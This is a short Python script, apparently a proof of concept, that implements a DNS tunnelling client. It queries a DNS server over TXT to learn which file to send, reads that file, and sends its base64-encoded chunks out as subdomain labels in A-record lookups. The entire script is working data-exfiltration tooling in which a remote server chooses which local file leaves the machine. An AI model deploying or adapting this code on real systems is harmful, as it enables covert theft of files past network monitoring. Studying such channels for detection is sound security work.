__author__ = "Adel Tchernitsky"


import dns.resolver
import base64
import hashlib


DNS_SERVER = "127.0.0.1"


def b64_encode(data):  # data should already be bytes
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def dot_every_n(s, n):
    return ".".join(s[i:i+n] for i in range(0, len(s), n))


def split_bytes(data, chunk_size):
    return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]


def get_file(file_name):
    with open(file_name, "rb") as f:
        return f.read()


def get_msg_id(file_content):
    # Create a hash object
    hash_object = hashlib.sha256(file_content)
    hash_hex = hash_object.hexdigest() # Hexadecimal string
    return hash_hex[:4]


def generate_messages(to_send_in_bytes, chunk_size, n):
    chunks = split_bytes(to_send_in_bytes, chunk_size)
    return [dot_every_n(b64_encode(chunk), n) for chunk in chunks]


def send_message(data, server_ip, msg_type, msg_id=None):
    resolver = dns.resolver.Resolver()
    resolver.nameservers = [server_ip]
    if type(data) == str:
        data = data.encode("utf-8")

    messages = generate_messages(data, 12, 2)
    print(messages)
    answers = []
    for domain in messages:
        try:
            answer = resolver.resolve(domain, msg_type)
            answers.append(answer)
        except Exception as e:
            print(f"Error: {e}")
    return answers


def ask_which_file(server_ip):
    response = send_message("Which file would you like to receive", server_ip, "TXT")
    for rdata in response[0]:
        for txt_bytes in rdata.strings:
            text = txt_bytes.decode(errors="ignore")
            print("TXT:", text)
            return text


def send_file(file_name, server_ip):
    file_content = get_file(file_name)
    msg_id = get_msg_id(file_content)
    responses = send_message(file_content, server_ip, "A", msg_id)
    for response in responses:
        for rdata in response:
            print(f"Response: {rdata}")


def main():
    file_name = ask_which_file(DNS_SERVER)
    send_file(file_name, DNS_SERVER)


if __name__ == "__main__":
    main()
